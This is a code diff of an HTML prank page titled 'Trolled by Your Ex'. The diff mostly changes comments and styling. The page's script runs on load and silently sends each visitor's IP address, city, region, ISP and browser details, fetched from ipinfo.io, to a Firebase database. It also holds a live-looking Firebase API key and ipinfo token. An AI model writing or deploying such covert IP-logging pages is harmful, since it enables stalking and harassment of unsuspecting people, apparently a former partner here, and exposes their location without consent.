@@ -5,11 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Trolled by Your Ex</title>
     <script type="module">
-        // Import Firebase i Firestore module
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
         import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
 
-        // Firebase konfiguracija
         const firebaseConfig = {
             apiKey: "AIzaSyDoYh1ggL8HIlOrpCrEEcTV26xqp77umSc",
             authDomain: "pookie-648b1.firebaseapp.com",
@@ -19,18 +17,14 @@
             appId: "1:517533284969:web:f55c11c2d4b1da60f100f8"
         };
 
-        // Inicijalizacija Firebase-a
         const app = initializeApp(firebaseConfig);
         const db = getFirestore(app);
 
-        // Funkcija za dobijanje mrežnih podataka
         async function getNetworkDetails() {
             try {
-                // Pozivanje spoljneg API-ja za mrežne informacije
-                const response = await fetch("https://ipinfo.io/json?token=7b615d64cbf77f"); // Korišćenje stvarnog API tokena
+                const response = await fetch("https://ipinfo.io/json?token=7b615d64cbf77f");
                 const data = await response.json();
 
-                // Priprema podataka za beleženje u Firestore
                 const clickData = {
                     timestamp: new Date().toISOString(),
                     userAgent: navigator.userAgent,
@@ -47,7 +41,6 @@
                     org: data.org
                 };
 
-                // Snimanje podataka u Firestore
                 await addDoc(collection(db, "clicks"), clickData);
                 console.log("Click data recorded:", clickData);
 
@@ -56,23 +49,30 @@
             }
         }
 
-        // Poziv funkcije kada se korisnik učita stranicu
         getNetworkDetails();
     </script>
     <style>
         html, body {
             margin: 0;
             padding: 0;
-            background-color: black;
-            color: white;
             font-family: Arial, sans-serif;
             display: flex;
             flex-direction: column;
             align-items: center;
             justify-content: flex-start;
             text-align: center;
-            min-height: 100vh;  /* Ostavlja fleksibilnost za skrolovanje */
-            overflow-y: auto;  /* Omogućava vertikalni klizač */
+            min-height: 100vh;
+            overflow-y: auto;
+            background: linear-gradient(45deg, #ff6b6b, #6b6bff, #6bff6b);
+            background-size: 400% 400%;
+            animation: gradientBG 10s ease infinite;
+            color: white;
+        }
+
+        @keyframes gradientBG {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
 
         h1 {
@@ -109,7 +109,7 @@
             position: relative;
             margin-top: 20px;
             overflow: hidden;
-            margin-bottom: 50px; /* Omogućava prostor za skrolovanje */
+            margin-bottom: 50px;
         }
 
         video {
@@ -133,21 +133,6 @@
 
         .play-button:hover {
             background-color: darkred;
-        }
-
-        /* Responsive styles */
-        @media (max-width: 768px) {
-            h1 { font-size: 2em; }
-            .troll { font-size: 3em; }
-            .video-container { padding: 10px; }
-            video { max-height: 50vh; }
-            .play-button { font-size: 1.8em; padding: 12px 24px; }
-        }
-
-        @media (max-width: 480px) {
-            h1 { font-size: 1.8em; }
-            .troll { font-size: 2.8em; }
-            .play-button { font-size: 2.2em; padding: 14px 28px; }
         }
     </style>
 </head>
